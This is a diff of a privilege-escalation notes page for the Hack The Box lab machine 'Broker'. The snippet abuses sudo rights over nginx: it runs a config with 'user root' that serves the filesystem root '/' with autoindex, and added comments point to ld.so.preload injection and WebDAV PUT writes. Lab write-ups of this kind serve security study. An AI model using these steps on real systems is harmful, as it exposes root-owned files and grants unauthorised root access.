@@ -161,24 +161,24 @@ $ sudo knife user list -c config.rb
 
 [![broker](../../../../_badges/htb-p/broker.svg)](https://app.hackthebox.com/machines/Broker)
 
-```shell!
+```ps
 $ cat $(pwd)/test.conf
 user root;
+# each URL is injected in LD PRELOAD
+# leading to the execution of junk then our custom .so
+# error_log /etc/ld.so.preload warn;
 events {
-    worker_connections 768;
+    worker_connections 1024;
 }
 http {
     server {
        listen 80;
-        server_name  pwned.test;
-
-        location / {
-            root /;
-            autoindex on; 
-        }
+       root /;
+       autoindex on;
+       # dav_methods PUT;
     }
 }
-$ sudo nginx -s stop
-$ sudo nginx -c $(pwd)/test.conf
+$ sudo /path/to/nginx -s stop
+$ sudo /path/to/nginx -c $(pwd)/test.conf
 ```
 </div></div>
